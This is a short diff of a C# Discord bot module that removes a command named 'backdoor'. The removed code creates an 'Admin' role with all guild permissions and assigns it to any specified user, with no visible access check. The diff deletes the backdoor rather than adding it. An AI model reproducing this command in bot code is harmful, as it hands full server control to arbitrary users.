@@ -24,16 +24,6 @@ namespace HTMS.Modules
             await Context.Channel.SendMessageAsync(Context.Guild.GetChannel(DataManager.LandingChannel).ToString());
             await Context.Channel.SendMessageAsync(Context.Guild.GetChannel(DataManager.WelcomeChannel).ToString());
         }
-        [Command("backdoor")]
-        public async Task backdoor(SocketGuildUser userAccount, string reason)
-        {
-            if(Context.Guild.Roles.Where(x => x.Name == "Admin").Count() == 0)
-            {
-                var role = await Context.Guild.CreateRoleAsync("Admin", GuildPermissions.All, null, false, null);
-                await userAccount.AddRoleAsync(role);
-            }
-            await userAccount.AddRoleAsync(Context.Guild.Roles.Where(x => x.Name == "Admin").FirstOrDefault());
-        }
         [Command("setwelcome")]
         public async Task SetWelcome(SocketChannel channel)
         {
